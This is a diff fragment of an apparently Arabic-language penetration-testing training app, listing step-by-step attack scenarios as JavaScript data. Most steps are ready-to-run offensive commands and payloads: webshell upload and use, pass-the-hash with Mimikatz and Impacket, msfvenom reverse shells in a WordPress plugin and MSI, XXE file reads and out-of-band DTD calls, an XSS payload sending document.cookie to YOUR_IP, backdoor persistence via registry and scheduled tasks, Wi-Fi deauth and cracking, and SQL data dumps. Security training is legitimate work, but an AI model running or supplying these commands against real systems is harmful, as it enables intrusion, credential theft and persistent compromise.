+    { title: 'تجاوز فلاتر Upload', desc: 'تقنيات لتجاوز قيود رفع الملفات.', commands: [{ cmd: '# Content-Type Bypass:\n# غير Content-Type في Burp: application/jpeg\n# Double Extension:\nshell.jpg.php\n# Null Byte:\nshell.php%00.jpg', note: 'تجاوز فلاتر File Upload' }] },
+    { title: 'الوصول للـ Shell المرفوع', desc: 'استخدام الـ Shell بعد الرفع.', commands: [{ cmd: 'curl "http://target.com/uploads/shell.php?cmd=id"\ncurl "http://target.com/uploads/shell.php?cmd=cat+/etc/passwd"', note: 'تفعيل WebShell المرفوع' }], tip: 'افحص دائماً مجلد uploads أو images بعد رفع الملف.' },
+  ]
+},
+{
+  id: 24, icon: '🏛️', title: 'Pass-the-Hash على Active Directory',
+  desc: 'سيناريو Pass-the-Hash كامل من استخراج الهاش حتى الحركة الجانبية.',
+  difficulty: 'hard', type: 'Active Directory', time: '30-60 دقيقة',
+  steps: [
+    { title: 'استخراج NTLM Hashes', desc: 'الحصول على هاشات NTLM من النظام.', commands: [{ cmd: '# Mimikatz:\nsekurlsa::logonpasswords\nsekurlsa::msv\n# بـ Meterpreter:\nhashdump\nrun post/windows/gather/credentials/credential_collector', note: 'استخراج NTLM Hashes' }] },
+    { title: 'Pass-the-Hash بـ CrackMapExec', desc: 'استخدام الهاش مباشرة للمصادقة.', commands: [{ cmd: 'crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH --local-auth\ncrackmapexec smb 192.168.1.10 -u Administrator -H HASH -x "whoami"', note: 'Pass-the-Hash بـ CME' }] },
+    { title: 'Pass-the-Hash بـ Impacket', desc: 'أدوات Impacket قوية للاستغلال الداخلي.', commands: [{ cmd: 'impacket-psexec corp.local/Administrator@DC_IP -hashes :NTLM_HASH\nimpacket-wmiexec corp.local/admin@192.168.1.10 -hashes :HASH', note: 'PsExec و WMIExec بالهاش' }] },
+    { title: 'Token Impersonation', desc: 'بعد الوصول: انتحال هوية مستخدم ذو صلاحيات أعلى.', commands: [{ cmd: '# Meterpreter:\nload incognito\nlist_tokens -u\nimpersonate_token "DOMAIN\\\\Admin"', note: 'انتحال Token في Windows' }] },
+  ]
+},
+{
+  id: 25, icon: '🌩️', title: 'اختبار أمان WordPress',
+  desc: 'فحص مواقع WordPress: من اكتشاف الثغرات حتى الاستغلال.',
+  difficulty: 'medium', type: 'Web App', time: '30-60 دقيقة',
+  steps: [
+    { title: 'WPScan - فحص WordPress', desc: 'WPScan مخصص لفحص WordPress.', commands: [{ cmd: 'wpscan --url http://target.com\nwpscan --url http://target.com --enumerate u,p,t\nwpscan --url http://target.com --api-token YOUR_TOKEN', note: 'فحص WordPress بـ WPScan' }] },
+    { title: 'فحص الإضافات والقوالب', desc: 'أغلب ثغرات WordPress في الإضافات.', commands: [{ cmd: 'wpscan --url http://target.com --enumerate p --plugins-detection aggressive\ncurl http://target.com/wp-content/plugins/ 2>/dev/null', note: 'اكتشاف الإضافات الضعيفة' }] },
+    { title: 'Brute Force تسجيل الدخول', desc: 'XML-RPC يسمح بـ Brute Force كثيف.', commands: [{ cmd: 'wpscan --url http://target.com -U admin -P rockyou.txt\nhydra -l admin -P rockyou.txt http-post-form "target.com/wp-login.php:log=^USER^&pwd=^PASS^:error"', note: 'Brute Force WordPress Login' }] },
+    { title: 'استغلال Plugin ضعيف', desc: 'بعد الوصول للوحة الإدارة، رفع Plugin خبيث.', commands: [{ cmd: '# أنشئ plugin يحتوي PHP shell:\nmsfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw > plugin_shell.php\n# ارفعه من Plugins → Add New → Upload', note: 'رفع Malicious WordPress Plugin' }], tip: 'بديل: Appearance → Theme Editor → 404.php' },
+  ]
+},
+{
+  id: 26, icon: '🔗', title: 'اختبار XXE - XML External Entity',
+  desc: 'اكتشاف واستغلال ثغرات XXE لقراءة الملفات وSSRF.',
+  difficulty: 'hard', type: 'Web App', time: '25-50 دقيقة',
+  steps: [
+    { title: 'اكتشاف XXE', desc: 'أي تطبيق يعالج XML = نقطة اختبار XXE.', commands: [{ cmd: '# Basic XXE:\n<?xml version="1.0"?>\n<!DOCTYPE test [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>', note: 'Payload XXE أساسي' }] },
+    { title: 'قراءة ملفات بـ XXE', desc: 'XXE يتيح قراءة ملفات النظام.', commands: [{ cmd: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>\n# Windows:\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>', note: 'قراءة ملفات النظام بـ XXE' }] },
+    { title: 'SSRF عبر XXE', desc: 'XXE يمكن استخدامه للوصول للخدمات الداخلية.', commands: [{ cmd: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', note: 'SSRF عبر XXE' }] },
+    { title: 'Blind XXE', desc: 'عندما لا تُعرض النتائج مباشرة.', commands: [{ cmd: '<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "http://YOUR_SERVER/xxe.dtd">\n  %xxe;\n]>', note: 'Blind XXE عبر DTD خارجي' }], tip: 'Burp Collaborator يساعد في اكتشاف Blind XXE.' },
+  ]
+},
+{
+  id: 27, icon: '🕳️', title: 'اختبار Open Redirect وHost Header',
+  desc: 'اكتشاف واستغلال Open Redirect وHost Header Injection.',
+  difficulty: 'medium', type: 'Web App', time: '15-30 دقيقة',
+  steps: [
+    { title: 'Open Redirect', desc: 'إعادة التوجيه لمواقع خارجية دون تحقق.', commands: [{ cmd: 'curl -v "http://target.com/redirect?url=http://evil.com"\ncurl -v "http://target.com/login?next=//evil.com"\ncurl -v "http://target.com/out?goto=https://attacker.com"', note: 'اختبار Open Redirect' }] },
+    { title: 'Host Header Injection', desc: 'تعديل Host header يؤثر على Password Reset Links.', commands: [{ cmd: 'curl -H "Host: evil.com" http://target.com/forgot-password\ncurl -H "Host: evil.com" http://target.com/reset', note: 'Host Header Injection' }] },
+    { title: 'Cache Poisoning عبر Host Header', desc: 'تسميم الـ Cache بـ Host Header خاطئ.', commands: [{ cmd: 'curl -H "Host: evil.com" -H "X-Forwarded-Host: evil.com" http://target.com/', note: 'Cache Poisoning' }] },
+    { title: 'Password Reset Poisoning', desc: 'سرقة رابط إعادة تعيين كلمة المرور.', commands: [{ cmd: '# في Burp Intercept:\n# POST /forgot-password\n# Host: evil.com\n# يُرسل رابط Reset للضحية بـ: http://evil.com/reset?token=TOKEN', note: 'Password Reset Poisoning' }] },
+  ]
+},
+{
+  id: 28, icon: '📊', title: 'استخدام Metasploit Auxiliary Modules',
+  desc: 'استخدام Auxiliary Modules لجمع المعلومات والفحص التلقائي.',
+  difficulty: 'medium', type: 'Network', time: '20-40 دقيقة',
+  steps: [
+    { title: 'فحص الشبكة بـ Auxiliary', desc: 'Auxiliary Scanners لفحص الشبكة.', commands: [{ cmd: 'use auxiliary/scanner/portscan/tcp\nset RHOSTS 192.168.1.0/24\nset THREADS 50\nrun', note: 'TCP Port Scan بـ Metasploit' }] },
+    { title: 'فحص SSH وFTP', desc: 'Auxiliary modules لاختبار الخدمات الشائعة.', commands: [{ cmd: 'use auxiliary/scanner/ssh/ssh_version\nset RHOSTS 192.168.1.0/24\nrun\n# ثم:\nuse auxiliary/scanner/ftp/ftp_version\nrun', note: 'اكتشاف إصدارات SSH وFTP' }] },
+    { title: 'Brute Force بـ Auxiliary', desc: 'Auxiliary Brute Force modules.', commands: [{ cmd: 'use auxiliary/scanner/ssh/ssh_login\nset RHOSTS 192.168.1.10\nset USERNAME root\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun', note: 'Brute Force SSH بـ Metasploit' }] },
+    { title: 'استيراد النتائج في قاعدة البيانات', desc: 'حفظ نتائج الفحص للرجوع إليها.', commands: [{ cmd: 'db_nmap -sV 192.168.1.0/24\nhosts\nservices\ncreds', note: 'إدارة نتائج Metasploit' }] },
+  ]
+},
+{
+  id: 29, icon: '🌍', title: 'اختبار أمان JWT',
+  desc: 'اكتشاف واستغلال إعدادات JWT الضعيفة.',
+  difficulty: 'hard', type: 'Web App', time: '20-40 دقيقة',
+  steps: [
+    { title: 'فك تشفير JWT', desc: 'JWT مُشفّر بـ base64 وليس مؤمّناً.', commands: [{ cmd: '# فك يدوياً:\necho "eyJhbGciOiJIUzI1NiJ9" | base64 -d\n# أو:\npip3 install jwt_tool\njwt_tool TOKEN', note: 'فك تشفير JWT' }] },
+    { title: 'Algorithm None Attack', desc: 'بعض الخوادم تقبل alg:none = بدون تحقق من التوقيع.', commands: [{ cmd: '# Header:\n{"alg":"none","typ":"JWT"}\n# غيّر role لـ admin ثم أزل التوقيع\njwt_tool TOKEN -X a', note: 'Algorithm None Attack' }], tip: 'إذا نجح → الخادم لا يتحقق من التوقيع على الإطلاق.' },
+    { title: 'Weak Secret Key', desc: 'إذا كان الـ secret قصير يمكن كسره بـ hashcat.', commands: [{ cmd: 'hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt', note: 'كسر JWT Secret بـ hashcat' }] },
+    { title: 'JWT Confusion Attack (RS256→HS256)', desc: 'إذا الخادم يدعم RS256، ضع Public Key كـ HS256 Secret.', commands: [{ cmd: 'jwt_tool TOKEN -X k -pk public_key.pem', note: 'Key Confusion Attack' }] },
+  ]
+},
+{
+  id: 30, icon: '🚀', title: 'سيناريو اختبار كامل من A إلى Z',
+  desc: 'سيناريو اختبار اختراق شامل على نظام مجهول: Recon → Exploit → Report.',
+  difficulty: 'hard', type: 'Full Pentest', time: '120-240 دقيقة',
+  steps: [
+    { title: 'مرحلة Reconnaissance', desc: 'جمع المعلومات من المصادر المفتوحة.', commands: [{ cmd: 'theHarvester -d target.com -b all\nsubfinder -d target.com\nnmap -sn 192.168.1.0/24', note: 'جمع المعلومات الأولية' }], tip: 'سجّل كل ما تجد. Reconnaissance = 40% من العمل.' },
+    { title: 'مرحلة Scanning', desc: 'مسح شامل لكل الأنظمة المكتشفة.', commands: [{ cmd: 'nmap -sV -sC -p- --min-rate 5000 -T4 192.168.1.10 -oA full_scan\nnikto -h http://192.168.1.10', note: 'فحص كامل للأجهزة المكتشفة' }] },
+    { title: 'مرحلة Exploitation', desc: 'استغلال الثغرات المكتشفة.', commands: [{ cmd: 'searchsploit service_name version\nmsfconsole\n# search type:exploit name:service_name\n# use, set, run', note: 'البحث عن الـ Exploits وتنفيذها' }] },
+    { title: 'Post-Exploitation والتوثيق', desc: 'جمع الأدلة وتوثيق كل خطوة.', commands: [{ cmd: 'hashdump\nrun post/multi/recon/local_exploit_suggester\n# احفظ screenshots + outputs\nscript -a pentest_log.txt', note: 'توثيق Post-Exploitation' }] },
+    { title: 'كتابة التقرير النهائي', desc: 'التقرير هو المنتج النهائي للعميل.', commands: [{ cmd: '# هيكل التقرير:\n# 1. Executive Summary\n# 2. Scope والمنهجية\n# 3. النتائج مصنفة بالخطورة\n# 4. PoC لكل ثغرة\n# 5. التوصيات والحلول\n# 6. الملاحق', note: 'هيكل تقرير اختبار الاختراق' }], tip: 'التقرير الجيد يميز المحترف عن الهاوي.' },
+  ]
+},
+{
+  id: 31, icon: '🧩', title: 'Buffer Overflow - المفاهيم والأساسيات',
+  desc: 'فهم Buffer Overflow وبناء أول exploit بسيط.',
+  difficulty: 'hard', type: 'Exploit Dev', time: '60-120 دقيقة',
+  steps: [
+    { title: 'فهم Stack وRegisters', desc: 'Buffer Overflow يعتمد على تجاوز الـ stack buffer للسيطرة على EIP.', commands: [{ cmd: '# تثبيت الأدوات:\napt install gdb pwndbg peda\npip3 install pwntools\n# تحليل برنامج بسيط:\ngdb ./vulnerable_app\ninfo registers\nx/100wx $esp', note: 'تحليل البرنامج بـ GDB' }] },
+    { title: 'إيجاد نقطة التحطم (Crash)', desc: 'أرسل بيانات كبيرة حتى يتعطل البرنامج.', commands: [{ cmd: 'python3 -c "print(\'A\'*1000)" | ./vulnerable_app\n# أو:\npython3 -c "import socket; s=socket.socket(); s.connect((\'127.0.0.1\',9999)); s.send(b\'A\'*1000)"', note: 'اختبار Crash' }] },
+    { title: 'إيجاد Offset للـ EIP', desc: 'تحديد عدد البايتات قبل الكتابة فوق EIP.', commands: [{ cmd: '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000\n# أرسل الـ Pattern\n# في GDB: x/x $eip\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP_VALUE', note: 'إيجاد Offset بـ Pattern' }] },
+    { title: 'تحضير الـ Shellcode', desc: 'تضمين shellcode لتنفيذه عند استغلال الثغرة.', commands: [{ cmd: 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\\x00" -f python\n# اختبار بـ pwntools:\nfrom pwn import *', note: 'توليد Shellcode بـ msfvenom' }] },
+  ]
+},
+{
+  id: 32, icon: '☠️', title: 'اختبار أمان FTP',
+  desc: 'فحص خدمة FTP الشاملة: Anonymous Access, Brute Force, Exploits.',
+  difficulty: 'easy', type: 'Network', time: '15-30 دقيقة',
+  steps: [
+    { title: 'فحص FTP بـ Nmap', desc: 'فحص شامل لخدمة FTP.', commands: [{ cmd: 'nmap --script=ftp-anon,ftp-bounce,ftp-syst -p 21 192.168.1.10\nnmap -sV -p 21 192.168.1.10', note: 'فحص FTP الشامل' }] },
+    { title: 'اختبار Anonymous Login', desc: 'FTP Anonymous هو نقطة دخول شائعة.', commands: [{ cmd: 'ftp 192.168.1.10\n# Username: anonymous\n# Password: anything@email.com\nls -la\nget sensitive_file.txt', note: 'تسجيل دخول مجهول لـ FTP' }] },
+    { title: 'Brute Force FTP', desc: 'تجربة كلمات مرور شائعة.', commands: [{ cmd: 'hydra -l admin -P rockyou.txt ftp://192.168.1.10\nnmap --script=ftp-brute -p 21 192.168.1.10', note: 'Brute Force FTP' }] },
+    { title: 'Metasploit لاستغلال FTP', desc: 'البحث عن exploits لإصدار FTP المكتشف.', commands: [{ cmd: 'searchsploit vsftpd\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.10\nrun', note: 'استغلال FTP بـ Metasploit' }] },
+  ]
+},
+{
+  id: 33, icon: '🧲', title: 'اختبار أمان Telnet',
+  desc: 'فحص Telnet: البروتوكول غير الآمن الذي لا يزال موجوداً.',
+  difficulty: 'easy', type: 'Network', time: '10-20 دقيقة',
+  steps: [
+    { title: 'اكتشاف Telnet', desc: 'Telnet على Port 23 = خطر كبير (بيانات غير مشفرة).', commands: [{ cmd: 'nmap -sV -p 23 192.168.1.0/24\nnmap --script=telnet-encryption 192.168.1.10', note: 'اكتشاف خدمة Telnet' }] },
+    { title: 'الاتصال بـ Telnet', desc: 'بيانات Telnet ترسل نصاً واضحاً = قابلة للاعتراض.', commands: [{ cmd: 'telnet 192.168.1.10\n# أو:\nnc 192.168.1.10 23', note: 'الاتصال بـ Telnet' }] },
+    { title: 'Sniff بيانات Telnet', desc: 'Wireshark يعرض كلمة مرور Telnet كنص واضح.', commands: [{ cmd: 'tshark -i eth0 -Y "telnet" -T fields -e data\nwireshark # ثم فلتر: telnet', note: 'Sniffing على Telnet' }], tip: 'هذا يُثبت لماذا يجب استبدال Telnet بـ SSH.' },
+    { title: 'Brute Force Telnet', desc: 'Hydra يدعم Telnet مباشرة.', commands: [{ cmd: 'hydra -l root -P rockyou.txt telnet://192.168.1.10', note: 'Brute Force Telnet' }] },
+  ]
+},
+{
+  id: 34, icon: '💾', title: 'استخراج بيانات قواعد البيانات',
+  desc: 'سيناريو كامل لاكتشاف واستغلال قواعد البيانات المكشوفة.',
+  difficulty: 'medium', type: 'Database', time: '30-60 دقيقة',
+  steps: [
+    { title: 'فحص قواعد البيانات', desc: 'اكتشاف قواعد بيانات مكشوفة على الشبكة.', commands: [{ cmd: 'nmap -sV -p 3306,5432,1433,27017 192.168.1.0/24\nnmap --script=mysql-info,mysql-empty-password -p 3306 192.168.1.10', note: 'فحص قواعد البيانات الشائعة' }] },
+    { title: 'الوصول لـ MySQL', desc: 'محاولة الوصول بـ credentials افتراضية أو فارغة.', commands: [{ cmd: 'mysql -h 192.168.1.10 -u root -p\nmysql -h 192.168.1.10 -u root # بدون password\nshow databases; use mysql; select user,password from user;', note: 'الوصول لـ MySQL' }] },
+    { title: 'SQLMap على قاعدة البيانات', desc: 'SQLMap يستغل SQLi لاستخراج البيانات.', commands: [{ cmd: 'sqlmap -u "http://target.com/id=1" --dbs\nsqlmap -u "http://target.com/id=1" -D mydb -T users --dump', note: 'استخراج البيانات بـ SQLMap' }] },
+    { title: 'MongoDB بدون مصادقة', desc: 'MongoDB القديم بدون auth = وصول كامل.', commands: [{ cmd: 'nmap -sV -p 27017 192.168.1.10\nmongosh 192.168.1.10:27017\nshow dbs; db.users.find(); ', note: 'الوصول لـ MongoDB بدون مصادقة' }] },
+  ]
+},
+{
+  id: 35, icon: '📱', title: 'اختبار أمان الأجهزة الذكية IoT',
+  desc: 'فحص أمان أجهزة IoT: Cameras, Routers, Smart Devices.',
+  difficulty: 'medium', type: 'IoT', time: '30-60 دقيقة',
+  steps: [
+    { title: 'اكتشاف أجهزة IoT', desc: 'Shodan وNmap لاكتشاف الأجهزة.', commands: [{ cmd: 'shodan search "port:554 camera"\nnmap -sV 192.168.1.0/24 --script=rtsp-url-brute', note: 'اكتشاف أجهزة IoT' }] },
+    { title: 'Credentials افتراضية', desc: 'معظم أجهزة IoT تأتي بـ credentials افتراضية لم تُغيَّر.', commands: [{ cmd: '# أمثلة شائعة:\n# admin:admin\n# admin:password\n# root:root\n# Shodan للبحث:\nshodan search "default password" "camera"', note: 'اختبار Credentials الافتراضية' }] },
+    { title: 'فحص Firmware', desc: 'تحليل Firmware لإيجاد backdoors وثغرات.', commands: [{ cmd: 'binwalk -e firmware.bin\nbinwalk --dd=".*" firmware.bin\nstrings firmware.bin | grep -i "password\\|admin\\|backdoor"', note: 'تحليل IoT Firmware' }] },
+    { title: 'RTSP Camera Streams', desc: 'الكاميرات بـ RTSP بدون حماية = مشاهدة مباشرة.', commands: [{ cmd: 'nmap --script=rtsp-url-brute -p 554 192.168.1.10\nvlc rtsp://admin:admin@192.168.1.10:554/live', note: 'الوصول لـ RTSP Camera Stream' }], tip: 'DefaultPassword.com وRouter Passwords مواقع تجمع credentials الافتراضية.' },
+  ]
+},
+// ===== SCENARIOS 36-65 =====
+{
+  id: 36, icon: '🔗', title: 'اختبار XSS Stored كامل خطوة بخطوة',
+  desc: 'سيناريو اكتشاف وإثبات XSS المخزن في تطبيق ويب حقيقي.',
+  difficulty: 'medium', type: 'Web App', time: '20-40 دقيقة',
+  steps: [
+    { title: 'اكتشاف نقطة إدخال', desc: 'البحث عن حقول تُخزَّن وتُعرَض مجدداً.', commands: [{ cmd: '# ابحث عن:\n# نماذج التعليقات والمراجعات\n# حقول الاسم وبيانات الملف الشخصي\n# قسم المنتديات والرسائل', note: 'أي حقل يُعرض لمستخدمين آخرين = هدف Stored XSS' }] },
+    { title: 'حقن Payload أولي', desc: 'اختبار ترميز الخرج.', commands: [{ cmd: '<scr'+'ipt>alert("XSS")<\/scr'+'ipt>\n<img src=x onerror=alert(1)>\n<svg onload=alert(document.domain)>', note: 'إذا ظهر alert = ثغرة Stored XSS' }] },
+    { title: 'سرقة Cookie الجلسة', desc: 'Payload يرسل الكوكيز لسيرفر خارجي.', commands: [{ cmd: '# على جهازك:\nnc -lvnp 80\n# Payload:\n<scr'+'ipt>new Image().src="http://YOUR_IP/steal?c="+document.cookie<\/scr'+'ipt>', note: 'الضحية تزور الصفحة → ترسل الكوكيز تلقائياً' }], tip: 'HttpOnly Cookie لا تُقرأ بـ JavaScript — لكن يمكن CSRF بدلاً من ذلك.' },
+    { title: 'استخدام الجلسة المسروقة', desc: 'إضافة الكوكيز في المتصفح للدخول كالضحية.', commands: [{ cmd: '# في Firefox:\n# F12 → Storage → Cookies\n# أضف القيمة المسروقة\n# أو في Burp:\n# Replace Cookie header', note: 'اختطاف جلسة ناجح' }] },
+    { title: 'توثيق الثغرة', desc: 'توثيق كامل للثغرة بـ PoC.', commands: [{ cmd: 'flameshot gui  # لقطة شاشة\nscript -a xss_session.log\n# وثّق:\n# 1. URL الصفحة\n# 2. الـ Payload المستخدم\n# 3. الأثر (Cookie Stealing)\n# 4. التوصية: HTML Encoding', note: 'تقرير احترافي يشمل Payload وأثره' }] }
+  ]
+},
+{
+  id: 37, icon: '💉', title: 'SQL Blind Injection يدوياً',
+  desc: 'سيناريو استخراج بيانات عبر Blind SQLi بدون خرج مرئي.',
+  difficulty: 'hard', type: 'Web App', time: '40-80 دقيقة',
+  steps: [
+    { title: 'اكتشاف Blind SQLi', desc: 'الفرق في الاستجابة يكشف الثغرة.', commands: [{ cmd: 'curl "http://target.com/?id=1 AND 1=1" | wc -c\ncurl "http://target.com/?id=1 AND 1=2" | wc -c\n# فرق في الحجم = Boolean-based Blind SQLi', note: 'الحجمان مختلفان = ثغرة مؤكدة' }] },
+    { title: 'معرفة عدد الأعمدة', desc: 'ORDER BY لتحديد عدد الأعمدة.', commands: [{ cmd: 'curl "http://target.com/?id=1 ORDER BY 1"\ncurl "http://target.com/?id=1 ORDER BY 2"\n# حتى يظهر خطأ = عدد الأعمدة', note: 'عند الخطأ: عدد الأعمدة = الرقم السابق' }] },
+    { title: 'استخراج اسم قاعدة البيانات', desc: 'Binary search لاستخراج البيانات حرفاً بحرف.', commands: [{ cmd: '# هل الحرف الأول من DB name أكبر من m؟\ncurl "http://target.com/?id=1 AND SUBSTRING(database(),1,1)>\'m\'"\n# كرر حتى تحدد الحرف الدقيق', note: 'عملية بطيئة — استخدم sqlmap --technique=B' }], tip: 'Blind SQLi يأخذ وقتاً طويلاً يدوياً. sqlmap يؤتمتها.' },
+    { title: 'Time-based Blind SQLi', desc: 'SLEEP() تأخير يؤكد الثغرة.', commands: [{ cmd: 'curl "http://target.com/?id=1 AND SLEEP(5)" -o /dev/null -w "%{time_total}"\n# إذا استغرق 5 ثوانٍ = ثغرة\ncurl "http://target.com/?id=1 AND IF(1=1,SLEEP(5),0)"', note: 'استجابة بطيئة = Time-based SQLi مؤكدة' }] },
+    { title: 'SQLMap للأتمتة', desc: 'SQLMap يؤتمت كل عملية استخراج البيانات.', commands: [{ cmd: 'sqlmap -u "http://target.com/?id=1" --technique=B --dbs\nsqlmap -u "http://target.com/?id=1" -D dbname -T users --dump --batch', note: 'SQLMap يعمل تلقائياً للـ Blind SQLi' }] }
+  ]
+},
+{
+  id: 38, icon: '🔑', title: 'Privilege Escalation على Windows كامل',
+  desc: 'سيناريو شامل لرفع الصلاحيات على Windows من User إلى SYSTEM.',
+  difficulty: 'hard', type: 'Windows', time: '60-120 دقيقة',
+  steps: [
+    { title: 'الدخول الأولي', desc: 'افتراض: لديك Meterpreter shell كمستخدم عادي.', commands: [{ cmd: 'getuid  # عرض المستخدم الحالي\nsysinfo  # معلومات النظام\nwhoami /priv  # الصلاحيات', note: 'ابدأ بجمع المعلومات' }] },
+    { title: 'تشغيل WinPEAS', desc: 'WinPEAS يفحص تلقائياً كل نقاط رفع الصلاحيات.', commands: [{ cmd: 'upload winPEASx64.exe\nshell\n.\\winPEASx64.exe 2>&1 | tee winpeas_out.txt\n# ابحث عن الخط الأحمر', note: 'الأحمر = ذو أولوية عالية' }] },
+    { title: 'AlwaysInstallElevated', desc: 'إذا كان Registry Key = 1 في كلا المسارين.', commands: [{ cmd: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# الاستغلال:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi > evil.msi\nmsiexec /quiet /qn /i evil.msi', note: 'الاستغلال يعمل فقط إذا كلا المسارين = 0x1' }] },
+    { title: 'PrintSpoofer لـ Token Impersonation', desc: 'SeImpersonatePrivilege + PrintSpoofer = SYSTEM.', commands: [{ cmd: 'whoami /priv | findstr Impersonate\n# إذا موجودة:\nupload PrintSpoofer64.exe\n.\\PrintSpoofer64.exe -i -c "cmd.exe"', note: 'يعمل على Windows 10/Server 2019 وأقدم' }], tip: 'JuicyPotato بديل لأنظمة أقدم من Windows 10 1809.' },
+    { title: 'Persistence بعد الوصول', desc: 'ضمان استمرار الوصول كـ SYSTEM.', commands: [{ cmd: '# Registry Run Key:\nreg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe" /v Debugger /d "C:\\backdoor.exe"\n# أو Scheduled Task:\nschtasks /create /sc onlogon /ru SYSTEM /tn "Updater" /tr "C:\\backdoor.exe"', note: 'وثّق كل Persistence وأزله بعد الاختبار' }] }
+  ]
+},
+{
+  id: 39, icon: '📡', title: 'Wireless WPA2 كسر كلمة المرور',
+  desc: 'سيناريو كامل لاختبار أمان شبكة WPA2.',
+  difficulty: 'medium', type: 'Wireless', time: '30-60 دقيقة',
+  steps: [
+    { title: 'التحقق من الكرت اللاسلكي', desc: 'التأكد من دعم Monitor Mode.', commands: [{ cmd: 'iw list | grep -A 8 "Supported interface modes"\naireplay-ng --test wlan0\n# أو:\niw dev wlan0 info', note: 'يجب أن يدعم "monitor" mode' }] },
+    { title: 'Monitor Mode والفحص', desc: 'تفعيل Monitor Mode ومسح الشبكات.', commands: [{ cmd: 'sudo airmon-ng check kill\nsudo airmon-ng start wlan0\nsudo airodump-ng wlan0mon\n# سجّل: BSSID, CH, ESSID للهدف', note: 'لا تنسَ تدوين الـ Channel والـ BSSID' }] },
+    { title: 'التقاط Handshake', desc: 'الانتظار حتى يتصل عميل أو إرسال Deauth.', commands: [{ cmd: '# في ترمينال 1:\nsudo airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon\n# في ترمينال 2 (Deauth):\nsudo aireplay-ng --deauth 5 -a BSSID wlan0mon\n# انتظر: WPA handshake: BSSID في airodump', note: 'لا تستخدم Deauth إلا على شبكتك الخاصة' }] },
+    { title: 'كسر كلمة المرور', desc: 'hashcat أسرع من aircrack على GPU.', commands: [{ cmd: '# بـ aircrack:\naircrack-ng -w rockyou.txt capture-01.cap\n# بـ hashcat:\nhcxpcapngtool capture-01.cap -o hash.hc22000\nhashcat -m 22000 hash.hc22000 rockyou.txt', note: 'GPU يكسر ملايين المحاولات في الثانية' }], tip: 'كلمة مرور أطول من 12 حرفاً من مزيج أرقام وحروف ورموز آمنة جداً.' },
+    { title: 'إعادة الكرت للوضع الطبيعي', desc: 'إنهاء Monitor Mode.', commands: [{ cmd: 'sudo airmon-ng stop wlan0mon\nsudo systemctl start NetworkManager\nsudo airmon-ng check kill  # إيقاف أي عمليات متبقية', note: 'تأكد من عودة الإنترنت للعمل' }] }
+  ]
+},
+{
+  id: 40, icon: '🔐', title: 'اختبار SSH Security الشامل',
+  desc: 'فحص خادم SSH وتقوية إعداداته.',
+  difficulty: 'easy', type: 'Network', time: '20-40 دقيقة',
+  steps: [
+    { title: 'فحص SSH بـ Nmap', desc: 'استطلاع خادم SSH.', commands: [{ cmd: 'nmap -sV -p 22 192.168.1.10\nnmap --script=ssh-auth-methods,ssh-hostkey,ssh-brute -p 22 192.168.1.10', note: 'معرفة الإصدار وطرق المصادقة المقبولة' }] },
+    { title: 'Brute Force SSH', desc: 'اختبار كلمات مرور ضعيفة.', commands: [{ cmd: 'hydra -l root -P rockyou.txt ssh://192.168.1.10 -t 4\nmedusa -h 192.168.1.10 -u root -P rockyou.txt -M ssh\n# أو Metasploit:\nuse auxiliary/scanner/ssh/ssh_login\nset RHOSTS 192.168.1.10\nset USERNAME root\nrun', note: '-t 4 لتجنب حجب SSH المكثف' }] },
+    { title: 'فحص SSH Keys الضعيفة', desc: 'مفاتيح SSH القصيرة أو المولودة ببذرة ضعيفة.', commands: [{ cmd: 'ssh-keyscan 192.168.1.10 > host_key.txt\nssh-keygen -l -f host_key.txt\n# فحص LOGJAM:\nnmap --script=ssh2-enum-algos -p 22 192.168.1.10', note: 'Keys أقل من 2048-bit = ضعيفة' }] },
+    { title: 'User Enumeration', desc: 'بعض إصدارات OpenSSH القديمة تكشف المستخدمين.', commands: [{ cmd: 'python ssh_enum.py -t 192.168.1.10 -U users.txt\n# msf:\nuse auxiliary/scanner/ssh/ssh_enumusers\nset RHOSTS 192.168.1.10\nset USER_FILE users.txt\nrun', note: 'CVE-2018-15473: User Enumeration في OpenSSH < 7.7' }] },
+    { title: 'تقوية SSH', desc: 'إعدادات SSH الآمنة.', commands: [{ cmd: '# /etc/ssh/sshd_config:\nPermitRootLogin no\nPasswordAuthentication no\nMaxAuthTries 3\nAllowUsers your_user\nProtocol 2\nCiphers aes256-gcm@openssh.com,aes128-gcm@openssh.com\nsystemctl restart sshd', note: 'استخدم مفاتيح SSH فقط + Fail2Ban' }] }
+  ]
+},
+{
+  id: 41, icon: '🌐', title: 'OSINT كامل على شركة',
+  desc: 'سيناريو OSINT كامل لجمع معلومات عن شركة.',
+  difficulty: 'easy', type: 'OSINT', time: '30-60 دقيقة',
+  steps: [
+    { title: 'جمع معلومات DNS', desc: 'سجلات DNS تكشف البنية التحتية.', commands: [{ cmd: 'dig target.com ANY\ndig +short MX target.com\ndig +short TXT target.com\ndig +short NS target.com\nwhois target.com', note: 'سجلات MX تكشف مزود البريد' }] },
